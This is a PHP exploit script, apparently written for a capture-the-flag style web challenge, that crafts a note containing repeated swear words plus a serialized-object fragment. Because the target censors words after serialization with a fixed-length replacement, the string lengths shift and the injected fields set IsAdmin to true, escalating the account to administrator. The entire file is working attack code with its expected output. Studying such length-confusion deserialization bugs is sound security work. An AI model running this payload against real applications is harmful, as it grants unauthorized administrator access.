<?php
/*
 * serialize_trick.php
 *
 * This script helped me to compute and verify a string that I could put into a note
 * to inject some modified fields into the serialized data of the user objects.
 *
 * Author: buzzert <buzzert@buzzert.net>
 */

include("src/user.php");

$me = new User("two", "two");

// From dumped src/util.php
$swears = [
	"shit",    // 4  (10-4) = 6
	"fuck",    // 4  (10-4) = 6
	"bitch",   // 5  (10-5) = 5
	"bastard", // 7  (10-7) = 3
	"asshole", // 7  (10-7) = 3
	"douche"   // 6  (10-6) = 4
];

// String to inject into the serialized version
// Same hashed password ("two"), but IsAdmin is now TRUE
// The end of this string will have ";} appended to it from the beginning of the injected string,
// so it will effectively be the end of the object definition.
$injection = '";}s:7:"IsAdmin";b:1;s:8:"Password";s:64:"3fc4ccfe745870e2c0d99f71f30ff0656c8dedd41cc1d7d3d376b0dbe685e2f3';

// Generated string of cuss words that allow the injected string to work
// This would be a string of cusswords whose remainder *'s add up to the length of 
// the string below
$cussing = "shitshitshitshitshitshitshitshitshitshitshitshitshitshitshitshitshitdouche";

echo "Make a note containing this text:\n";
echo $cussing . $injection;
echo "\n\n";

$me->createNote($cussing . $injection);

// This is the critical vulnerability found in util.php. Swears are overwritten with *'s
// *after* the string has been serialized, and the number of *'s does not depend on the replaced
// string length, so with a cleverly crafted 
$serialized = str_replace($swears, '**********', serialize($me));

// Print serialized version
var_dump(serialize($serialized));

// Deserialize -- make sure this works, otherwise your account will be broken on the server
echo "\n\ndeserialized\n\n";

$deserialized = unserialize($serialized);
var_dump($deserialized);

/*
	This should produce:
	object(User)#2 (4) {
	  ["Name"]=>
	  string(3) "two"
	  ["Notes"]=>
	  array(1) {
	    [0]=>
	    string(180) "************************************************************************************************************************************************************************************"
	  }
	  ["Password"]=>
	  string(64) "3fc4ccfe745870e2c0d99f71f30ff0656c8dedd41cc1d7d3d376b0dbe685e2f3"
	  ["IsAdmin"]=>
	  bool(true)        <----------- now TRUE!
	}
*/

?>


